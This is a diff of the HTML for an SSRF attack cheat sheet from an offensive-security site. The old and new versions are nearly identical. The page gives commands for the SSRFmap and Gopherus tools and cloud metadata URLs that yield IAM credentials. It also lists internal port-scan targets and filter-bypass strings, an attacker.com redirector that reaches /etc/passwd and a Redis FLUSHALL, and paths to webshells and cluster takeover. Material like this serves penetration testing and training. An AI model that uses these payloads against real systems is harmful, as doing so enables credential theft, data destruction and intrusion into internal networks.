+<a class=heading-permalink href=#ssrfmap aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Automated detection and exploitation against a known parameter:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone https://github.com/swisskyrepo/SSRFmap
+</span></span><span class=line><span class=cl><span class=c1>## Save request from Burp with the SSRF param marked (e.g., url=SSRF)</span>
+</span></span><span class=line><span class=cl>python3 ssrfmap.py -r request.txt -p url -m readfiles
+</span></span><span class=line><span class=cl>python3 ssrfmap.py -r request.txt -p url -m portscan
+</span></span><span class=line><span class=cl>python3 ssrfmap.py -r request.txt -p url -m aws    <span class=c1>## AWS metadata</span>
+</span></span><span class=line><span class=cl>python3 ssrfmap.py -r request.txt -p url -m gce    <span class=c1>## GCP metadata</span>
+</span></span><span class=line><span class=cl>python3 ssrfmap.py -r request.txt -p url -m azure  <span class=c1>## Azure metadata</span>
+</span></span></code></pre></div><p>Modules: portscan, readfiles, redis, mysql, github, fastcgi, smuggle, custom, etc.</p><h3 id=gopherus data-heading-permalink=true><span class=heading-content>Gopherus</span>
+<a class=heading-permalink href=#gopherus aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Generates gopher:// payloads for hitting internal services from SSRF:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone https://github.com/tarunkant/Gopherus
+</span></span><span class=line><span class=cl>python3 gopherus.py --exploit redis
+</span></span><span class=line><span class=cl>python3 gopherus.py --exploit mysql
+</span></span><span class=line><span class=cl>python3 gopherus.py --exploit smtp
+</span></span><span class=line><span class=cl>python3 gopherus.py --exploit fastcgi
+</span></span></code></pre></div><p>Outputs a <code>gopher://...</code> URL you paste into the SSRF param.</p><h3 id=interactsh--burp-collaborator data-heading-permalink=true><span class=heading-content>interactsh / Burp Collaborator</span>
+<a class=heading-permalink href=#interactsh--burp-collaborator aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Default OAST for blind SSRF. Use the Collaborator client in Burp or the <code>interactsh-client</code> CLI.</p><h2 id=iv-cloud-metadata-endpoints-the-highest-value-target data-heading-permalink=true><span class=heading-content>iv. Cloud metadata endpoints (the highest-value target)</span>
+<a class=heading-permalink href=#iv-cloud-metadata-endpoints-the-highest-value-target aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Cloud-hosted SSRF almost always escalates to full cloud compromise via metadata. Full coverage in <a href=/cheatsheets/cloud/cloud-recon/>Cloud Recon</a>
+section viii, but the quick reference:</p><p><strong>AWS IMDSv1</strong>:</p><pre tabindex=0><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;
+</code></pre><p><strong>AWS IMDSv2</strong> (PUT for token, then GET with header - most SSRFs can&rsquo;t do this):</p><pre tabindex=0><code>PUT /latest/api/token HTTP/1.1
 X-aws-ec2-metadata-token-ttl-seconds: 21600
 ## Then:
 X-aws-ec2-metadata-token: &lt;token&gt;
 GET /latest/meta-data/iam/security-credentials/&lt;role&gt;
-</code></pre><p><strong>Azure</strong> (requires <code>Metadata: true</code> header):</p>
-<pre tabindex="0"><code>http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/
-</code></pre><p><strong>GCP</strong> (requires <code>Metadata-Flavor: Google</code> header):</p>
-<pre tabindex="0"><code>http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
-</code></pre><p><strong>Kubernetes pods</strong>:</p>
-<pre tabindex="0"><code>https://kubernetes.default.svc/api/
+</code></pre><p><strong>Azure</strong> (requires <code>Metadata: true</code> header):</p><pre tabindex=0><code>http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/
+</code></pre><p><strong>GCP</strong> (requires <code>Metadata-Flavor: Google</code> header):</p><pre tabindex=0><code>http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+</code></pre><p><strong>Kubernetes pods</strong>:</p><pre tabindex=0><code>https://kubernetes.default.svc/api/
 ## or:
 http://kubernetes.default/
 </code></pre><p><strong>DigitalOcean, Alibaba, Oracle Cloud, Hetzner</strong>:
-Each has its own metadata endpoint at <code>169.254.169.254</code> with different paths. HackTricks has the full table.</p>
-<p>If the SSRF allows custom HTTP headers, IMDSv2 / Azure / GCP all work. If it&rsquo;s a &ldquo;GET this URL&rdquo; only, IMDSv1 (when available) or AWS legacy regions.</p>
-<h2 id="v-internal-port-scanning-via-ssrf" data-heading-permalink="true"><span class="heading-content">v. Internal port scanning via SSRF</span>
-    <a class="heading-permalink" href="#v-internal-port-scanning-via-ssrf" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When you can&rsquo;t read the response body but can observe timing/error differences:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Test these via your SSRF:</span>
-</span></span><span class="line"><span class="cl">http://10.0.0.1:80/
-</span></span><span class="line"><span class="cl">http://10.0.0.1:22/
-</span></span><span class="line"><span class="cl">http://10.0.0.1:3306/    <span class="c1">## MySQL</span>
-</span></span><span class="line"><span class="cl">http://10.0.0.1:6379/    <span class="c1">## Redis</span>
-</span></span><span class="line"><span class="cl">http://10.0.0.1:8080/    <span class="c1">## Internal admin</span>
-</span></span><span class="line"><span class="cl">http://127.0.0.1:8080/
-</span></span><span class="line"><span class="cl">http://localhost:8080/
-</span></span></code></pre></div><p>Response differences (status, body length, time) tell you which ports are open. Sweep RFC1918 ranges (<code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code>) plus loopback.</p>
-<p>SSRFmap&rsquo;s portscan module automates this.</p>
-<h2 id="vi-url-parser-confusion-the-bypass-goldmine" data-heading-permalink="true"><span class="heading-content">vi. URL parser confusion (the bypass goldmine)</span>
-    <a class="heading-permalink" href="#vi-url-parser-confusion-the-bypass-goldmine" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>The single most important SSRF reading: <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener noreferrer">Orange Tsai&rsquo;s &ldquo;A New Era of SSRF&rdquo;</a>
-. Different URL parsers handle edge cases differently. The same URL string is parsed as different hosts by validator vs fetcher.</p>
-<p>Classic tricks (try ALL of these against any SSRF filter):</p>
-<pre tabindex="0"><code>http://attacker.com@target.com/      ## authority confusion
+Each has its own metadata endpoint at <code>169.254.169.254</code> with different paths. HackTricks has the full table.</p><p>If the SSRF allows custom HTTP headers, IMDSv2 / Azure / GCP all work. If it&rsquo;s a &ldquo;GET this URL&rdquo; only, IMDSv1 (when available) or AWS legacy regions.</p><h2 id=v-internal-port-scanning-via-ssrf data-heading-permalink=true><span class=heading-content>v. Internal port scanning via SSRF</span>
+<a class=heading-permalink href=#v-internal-port-scanning-via-ssrf aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When you can&rsquo;t read the response body but can observe timing/error differences:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Test these via your SSRF:</span>
+</span></span><span class=line><span class=cl>http://10.0.0.1:80/
+</span></span><span class=line><span class=cl>http://10.0.0.1:22/
+</span></span><span class=line><span class=cl>http://10.0.0.1:3306/    <span class=c1>## MySQL</span>
+</span></span><span class=line><span class=cl>http://10.0.0.1:6379/    <span class=c1>## Redis</span>
+</span></span><span class=line><span class=cl>http://10.0.0.1:8080/    <span class=c1>## Internal admin</span>
+</span></span><span class=line><span class=cl>http://127.0.0.1:8080/
+</span></span><span class=line><span class=cl>http://localhost:8080/
+</span></span></code></pre></div><p>Response differences (status, body length, time) tell you which ports are open. Sweep RFC1918 ranges (<code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code>) plus loopback.</p><p>SSRFmap&rsquo;s portscan module automates this.</p><h2 id=vi-url-parser-confusion-the-bypass-goldmine data-heading-permalink=true><span class=heading-content>vi. URL parser confusion (the bypass goldmine)</span>
+<a class=heading-permalink href=#vi-url-parser-confusion-the-bypass-goldmine aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>The single most important SSRF reading: <a href=https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf target=_blank rel="noopener noreferrer">Orange Tsai&rsquo;s &ldquo;A New Era of SSRF&rdquo;</a>
+. Different URL parsers handle edge cases differently. The same URL string is parsed as different hosts by validator vs fetcher.</p><p>Classic tricks (try ALL of these against any SSRF filter):</p><pre tabindex=0><code>http://attacker.com@target.com/      ## authority confusion
 http://target.com#@attacker.com/     ## fragment confusion
 http://attacker.com\\.target.com/    ## backslash interpretation
 http://attacker.com\.target.com/
@@ -447,182 +89,38 @@ http://0177.0000.0000.0001/          ## octal IP
 http://localhost%2540attacker.com/   ## double-URL-encoded @
 http://attacker.com#.target.com/     ## hash confusion
 http:foo:bar@attacker.com:80@target.com/
-</code></pre><p>Each parser library accepts/rejects different ones. Cycle through, see which makes it past.</p>
-<p>PayloadsAllTheThings has the canonical list - keep that page open.</p>
-<h2 id="vii-dns-rebinding" data-heading-permalink="true"><span class="heading-content">vii. DNS rebinding</span>
-    <a class="heading-permalink" href="#vii-dns-rebinding" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When the SSRF resolves the URL once for validation (to check it&rsquo;s not internal), then again for the actual fetch (now resolving to internal), DNS rebinding bypasses host-based allowlists.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Use rebinding services:</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## 7f000001.7f000001.rbndr.us → first resolves to 127.0.0.1</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## (rotating DNS responses across requests)</span>
-</span></span></code></pre></div><p>Public rebinding services:</p>
-<ul>
-<li><code>rbndr.us</code> (Mozilla&rsquo;s tool)</li>
-<li><code>nip.io</code> (static, but useful for <code>&lt;ip&gt;.nip.io</code> for non-rebinding tests)</li>
-<li>Self-hosted: cobra rebind, custom Bind/PowerDNS</li>
-</ul>
-<h2 id="viii-protocol-smuggling-via-gopher" data-heading-permalink="true"><span class="heading-content">viii. Protocol smuggling via gopher://</span>
-    <a class="heading-permalink" href="#viii-protocol-smuggling-via-gopher" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p><code>gopher://</code> lets you send arbitrary bytes to a TCP service. When the SSRF accepts gopher (or libcurl-based fetchers do by default), you can talk to any service.</p>
-<p>Gopherus generates the bytes for you:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 gopherus.py --exploit redis
-</span></span><span class="line"><span class="cl"><span class="c1">## Returns: gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a...</span>
-</span></span></code></pre></div><p>What gopher:// gives you:</p>
-<ul>
-<li>Redis full command execution → SSH key write, webshell deploy (see [[02 Service Enum]] -&gt; Redis)</li>
-<li>MySQL queries (when no auth or weak creds)</li>
-<li>FastCGI direct interface → RCE on PHP backends</li>
-<li>SMTP for sending mail (internal phishing)</li>
-<li>Memcached commands</li>
-</ul>
-<p>Modern PHP and Node libraries often disable non-HTTP schemes. cURL accepts them by default unless <code>CURLOPT_PROTOCOLS</code> is set.</p>
-<h2 id="ix-redirect-chain-abuse" data-heading-permalink="true"><span class="heading-content">ix. Redirect chain abuse</span>
-    <a class="heading-permalink" href="#ix-redirect-chain-abuse" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When the SSRF refuses non-HTTP URLs but follows redirects, host a redirector on attacker.com:</p>
-<pre tabindex="0"><code>attacker.com/redir.php → 302 → file:///etc/passwd
+</code></pre><p>Each parser library accepts/rejects different ones. Cycle through, see which makes it past.</p><p>PayloadsAllTheThings has the canonical list - keep that page open.</p><h2 id=vii-dns-rebinding data-heading-permalink=true><span class=heading-content>vii. DNS rebinding</span>
+<a class=heading-permalink href=#vii-dns-rebinding aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When the SSRF resolves the URL once for validation (to check it&rsquo;s not internal), then again for the actual fetch (now resolving to internal), DNS rebinding bypasses host-based allowlists.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Use rebinding services:</span>
+</span></span><span class=line><span class=cl><span class=c1>## 7f000001.7f000001.rbndr.us → first resolves to 127.0.0.1</span>
+</span></span><span class=line><span class=cl><span class=c1>## (rotating DNS responses across requests)</span>
+</span></span></code></pre></div><p>Public rebinding services:</p><ul><li><code>rbndr.us</code> (Mozilla&rsquo;s tool)</li><li><code>nip.io</code> (static, but useful for <code>&lt;ip>.nip.io</code> for non-rebinding tests)</li><li>Self-hosted: cobra rebind, custom Bind/PowerDNS</li></ul><h2 id=viii-protocol-smuggling-via-gopher data-heading-permalink=true><span class=heading-content>viii. Protocol smuggling via gopher://</span>
+<a class=heading-permalink href=#viii-protocol-smuggling-via-gopher aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p><code>gopher://</code> lets you send arbitrary bytes to a TCP service. When the SSRF accepts gopher (or libcurl-based fetchers do by default), you can talk to any service.</p><p>Gopherus generates the bytes for you:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 gopherus.py --exploit redis
+</span></span><span class=line><span class=cl><span class=c1>## Returns: gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a...</span>
+</span></span></code></pre></div><p>What gopher:// gives you:</p><ul><li>Redis full command execution → SSH key write, webshell deploy (see <a href=/cheatsheets/linux-pentesting/02-service-enum/>02 Service Enum</a>
+-> Redis)</li><li>MySQL queries (when no auth or weak creds)</li><li>FastCGI direct interface → RCE on PHP backends</li><li>SMTP for sending mail (internal phishing)</li><li>Memcached commands</li></ul><p>Modern PHP and Node libraries often disable non-HTTP schemes. cURL accepts them by default unless <code>CURLOPT_PROTOCOLS</code> is set.</p><h2 id=ix-redirect-chain-abuse data-heading-permalink=true><span class=heading-content>ix. Redirect chain abuse</span>
+<a class=heading-permalink href=#ix-redirect-chain-abuse aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When the SSRF refuses non-HTTP URLs but follows redirects, host a redirector on attacker.com:</p><pre tabindex=0><code>attacker.com/redir.php → 302 → file:///etc/passwd
 attacker.com/redir.php → 302 → gopher://127.0.0.1:6379/_FLUSHALL
 attacker.com/redir.php → 302 → http://169.254.169.254/...
-</code></pre><p>libcurl-based fetchers follow cross-protocol redirects by default. Useful when the SSRF validates the initial URL is HTTP but follows wherever.</p>
-<h2 id="x-tricks-worth-knowing" data-heading-permalink="true"><span class="heading-content">x. Tricks worth knowing</span>
-    <a class="heading-permalink" href="#x-tricks-worth-knowing" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<h3 id="try-post-methods" data-heading-permalink="true"><span class="heading-content">Try POST methods</span>
-    <a class="heading-permalink" href="#try-post-methods" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>SSRF features often validate URL on submission but the actual fetch might allow methods you don&rsquo;t expect. Test if you can include a body via a URL parameter (HTTP POST with body via fragment).</p>
-<h3 id="sometimes-0000--localhost" data-heading-permalink="true"><span class="heading-content">Sometimes 0.0.0.0 = localhost</span>
-    <a class="heading-permalink" href="#sometimes-0000--localhost" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>On Linux, binding to <code>0.0.0.0</code> includes localhost. Fetcher resolving <code>0.0.0.0</code> hits services bound to all interfaces. Lots of internal admin panels listen on <code>0.0.0.0:8080</code>.</p>
-<h3 id="ipv6-surprises" data-heading-permalink="true"><span class="heading-content">IPv6 surprises</span>
-    <a class="heading-permalink" href="#ipv6-surprises" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<pre tabindex="0"><code>http://[::]:80/         → equivalent to localhost on dual-stack
+</code></pre><p>libcurl-based fetchers follow cross-protocol redirects by default. Useful when the SSRF validates the initial URL is HTTP but follows wherever.</p><h2 id=x-tricks-worth-knowing data-heading-permalink=true><span class=heading-content>x. Tricks worth knowing</span>
+<a class=heading-permalink href=#x-tricks-worth-knowing aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><h3 id=try-post-methods data-heading-permalink=true><span class=heading-content>Try POST methods</span>
+<a class=heading-permalink href=#try-post-methods aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>SSRF features often validate URL on submission but the actual fetch might allow methods you don&rsquo;t expect. Test if you can include a body via a URL parameter (HTTP POST with body via fragment).</p><h3 id=sometimes-0000--localhost data-heading-permalink=true><span class=heading-content>Sometimes 0.0.0.0 = localhost</span>
+<a class=heading-permalink href=#sometimes-0000--localhost aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>On Linux, binding to <code>0.0.0.0</code> includes localhost. Fetcher resolving <code>0.0.0.0</code> hits services bound to all interfaces. Lots of internal admin panels listen on <code>0.0.0.0:8080</code>.</p><h3 id=ipv6-surprises data-heading-permalink=true><span class=heading-content>IPv6 surprises</span>
+<a class=heading-permalink href=#ipv6-surprises aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><pre tabindex=0><code>http://[::]:80/         → equivalent to localhost on dual-stack
 http://[::1]/           → IPv6 localhost
 http://[0:0:0:0:0:ffff:127.0.0.1]/   → IPv4 mapped IPv6
-</code></pre><h3 id="filter-bypass-via-short-host" data-heading-permalink="true"><span class="heading-content">Filter bypass via short host</span>
-    <a class="heading-permalink" href="#filter-bypass-via-short-host" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Some filters check for <code>localhost</code> / <code>127.0.0.1</code> as literal strings. Bypass:</p>
-<ul>
-<li><code>127.1</code></li>
-<li><code>2130706433</code> (decimal)</li>
-<li><code>0x7f000001</code> (hex)</li>
-<li><code>017700000001</code> (octal)</li>
-</ul>
-<h3 id="cloud-allowlist-bypass" data-heading-permalink="true"><span class="heading-content">Cloud allowlist bypass</span>
-    <a class="heading-permalink" href="#cloud-allowlist-bypass" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>The filter rejects <code>169.254.169.254</code>. Try:</p>
-<ul>
-<li>IPv6 forms above</li>
-<li>Decimal: <code>2852039166</code></li>
-<li>Through a rebinding service</li>
-<li>Through a redirect chain</li>
-</ul>
-<h3 id="force-second-request" data-heading-permalink="true"><span class="heading-content">Force second request</span>
-    <a class="heading-permalink" href="#force-second-request" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>If the SSRF fetches one URL then makes a callback elsewhere, write your interactsh URL there too - sometimes two requests fire and the second uses different auth/permissions.</p>
-<h3 id="use-the-ssrf-for-content-exfil" data-heading-permalink="true"><span class="heading-content">Use the SSRF for content exfil</span>
-    <a class="heading-permalink" href="#use-the-ssrf-for-content-exfil" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>When the SSRF accepts file:// or php:// wrappers, read sensitive files (<code>/etc/passwd</code>, app configs, source code) and reflect them back via response body.</p>
-<h3 id="xxe--ssrf" data-heading-permalink="true"><span class="heading-content">XXE → SSRF</span>
-    <a class="heading-permalink" href="#xxe--ssrf" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Every XXE is also an SSRF, see [[WEB07 XXE]]. Use XXE when direct URL input is filtered but XML is parsed.</p>
-<h2 id="xi-references" data-heading-permalink="true"><span class="heading-content">xi. References</span>
-    <a class="heading-permalink" href="#xi-references" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<ul>
-<li><a href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener noreferrer">PortSwigger - SSRF</a>
-</li>
-<li><a href="https://portswigger.net/web-security/all-labs#server-side-request-forgery-ssrf" target="_blank" rel="noopener noreferrer">PortSwigger - SSRF labs</a>
-</li>
-<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener noreferrer">Orange Tsai - URL Parser Bypasses</a>
- - required reading</li>
-<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings - SSRF</a>
-</li>
-<li><a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery" target="_blank" rel="noopener noreferrer">HackTricks - SSRF</a>
-</li>
-<li><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener noreferrer">Gopherus</a>
-</li>
-<li><a href="https://github.com/swisskyrepo/SSRFmap" target="_blank" rel="noopener noreferrer">SSRFmap</a>
-</li>
-</ul>
-<h2 id="xii-where-it-leads" data-heading-permalink="true"><span class="heading-content">xii. Where it leads</span>
-    <a class="heading-permalink" href="#xii-where-it-leads" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<ul>
-<li>Cloud metadata → IAM creds → full account takeover, see [[AWS]] / [[Azure]] / [[GCP]]</li>
-<li>Internal Redis → SSH key write, webshell deploy → host RCE, see [[02 Service Enum]]</li>
-<li>Internal admin panels exposed only on RFC1918 → privesc on the app</li>
-<li>Internal SMTP → phishing from internal address (high credibility)</li>
-<li>Internal Kubernetes API → cluster takeover</li>
-<li>Read sensitive files via file:// → creds harvesting, see [[11 PrivEsc - Credentials &amp; Files]]</li>
-</ul>
-<p>SSRF on a cloud-hosted target is essentially RCE-equivalent because the IAM creds it leaks usually have enough access for an attacker to deploy compute / read storage / pivot anywhere.</p>
-
-        </div>
-
-        
-          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/web/web11-web-cache-poisoning/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Previous</span>
-              <span class="cheatsheet-pager-title">Web Cache Poisoning</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/web/web13-file-upload--lfi/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Next</span>
-              <span class="cheatsheet-pager-title">File Upload &amp; LFI</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a></nav>
-        
-      </div>
-    </div>
-  </article>
-  
-
-  </main>
-  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 18V6"></path>
-      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
-    </svg>
-  </button>
-  <footer class="site-footer">
-  <p>&copy; 2026 JinPwn</p>
-</footer>
-
-</body>
-</html>
+</code></pre><h3 id=filter-bypass-via-short-host data-heading-permalink=true><span class=heading-content>Filter bypass via short host</span>
+<a class=heading-permalink href=#filter-bypass-via-short-host aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Some filters check for <code>localhost</code> / <code>127.0.0.1</code> as literal strings. Bypass:</p><ul><li><code>127.1</code></li><li><code>2130706433</code> (decimal)</li><li><code>0x7f000001</code> (hex)</li><li><code>017700000001</code> (octal)</li></ul><h3 id=cloud-allowlist-bypass data-heading-permalink=true><span class=heading-content>Cloud allowlist bypass</span>
+<a class=heading-permalink href=#cloud-allowlist-bypass aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>The filter rejects <code>169.254.169.254</code>. Try:</p><ul><li>IPv6 forms above</li><li>Decimal: <code>2852039166</code></li><li>Through a rebinding service</li><li>Through a redirect chain</li></ul><h3 id=force-second-request data-heading-permalink=true><span class=heading-content>Force second request</span>
+<a class=heading-permalink href=#force-second-request aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>If the SSRF fetches one URL then makes a callback elsewhere, write your interactsh URL there too - sometimes two requests fire and the second uses different auth/permissions.</p><h3 id=use-the-ssrf-for-content-exfil data-heading-permalink=true><span class=heading-content>Use the SSRF for content exfil</span>
+<a class=heading-permalink href=#use-the-ssrf-for-content-exfil aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>When the SSRF accepts file:// or php:// wrappers, read sensitive files (<code>/etc/passwd</code>, app configs, source code) and reflect them back via response body.</p><h3 id=xxe--ssrf data-heading-permalink=true><span class=heading-content>XXE → SSRF</span>
+<a class=heading-permalink href=#xxe--ssrf aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Every XXE is also an SSRF, see <a href=/cheatsheets/web/web07-xxe/>WEB07 XXE</a>
+. Use XXE when direct URL input is filtered but XML is parsed.</p><h2 id=xi-references data-heading-permalink=true><span class=heading-content>xi. References</span>
+<a class=heading-permalink href=#xi-references aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><ul><li><a href=https://portswigger.net/web-security/ssrf target=_blank rel="noopener noreferrer">PortSwigger - SSRF</a></li><li><a href=https://portswigger.net/web-security/all-labs#server-side-request-forgery-ssrf target=_blank rel="noopener noreferrer">PortSwigger - SSRF labs</a></li><li><a href=https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf target=_blank rel="noopener noreferrer">Orange Tsai - URL Parser Bypasses</a>
+- required reading</li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery target=_blank rel="noopener noreferrer">PayloadsAllTheThings - SSRF</a></li><li><a href=https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery target=_blank rel="noopener noreferrer">HackTricks - SSRF</a></li><li><a href=https://github.com/tarunkant/Gopherus target=_blank rel="noopener noreferrer">Gopherus</a></li><li><a href=https://github.com/swisskyrepo/SSRFmap target=_blank rel="noopener noreferrer">SSRFmap</a></li></ul><h2 id=xii-where-it-leads data-heading-permalink=true><span class=heading-content>xii. Where it leads</span>
+<a class=heading-permalink href=#xii-where-it-leads aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><ul><li>Cloud metadata → IAM creds → full account takeover, see <a href=/cheatsheets/cloud/aws/>AWS</a>
+/ <a href=/cheatsheets/cloud/azure/>Azure</a>
+/ <a href=/cheatsheets/cloud/gcp/>GCP</a></li><li>Internal Redis → SSH key write, webshell deploy → host RCE, see <a href=/cheatsheets/linux-pentesting/02-service-enum/>02 Service Enum</a></li><li>Internal admin panels exposed only on RFC1918 → privesc on the app</li><li>Internal SMTP → phishing from internal address (high credibility)</li><li>Internal Kubernetes API → cluster takeover</li><li>Read sensitive files via file:// → creds harvesting, see <a href=/cheatsheets/linux-pentesting/11-privesc---credentials--files/>11 PrivEsc - Credentials & Files</a></li></ul><p>SSRF on a cloud-hosted target is essentially RCE-equivalent because the IAM creds it leaks usually have enough access for an attacker to deploy compute / read storage / pivot anywhere.</p></div><nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href=/cheatsheets/web/web11-web-cache-poisoning/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Previous</span>
+<span class=cheatsheet-pager-title>Web Cache Poisoning</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+</span></a><a class="cheatsheet-pager-link is-next" href=/cheatsheets/web/web13-file-upload--lfi/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Next</span>
+<span class=cheatsheet-pager-title>File Upload & LFI</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></span></a></nav></div></div></article></main><button class=scroll-top-button type=button data-scroll-top aria-label="Scroll to top" aria-hidden=true tabindex=-1>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 18V6"/><path d="M6.75 11.25 12 6l5.25 5.25"/></svg></button><footer class=site-footer><p>&copy; 2026 JinPwn</p></footer></body></html>
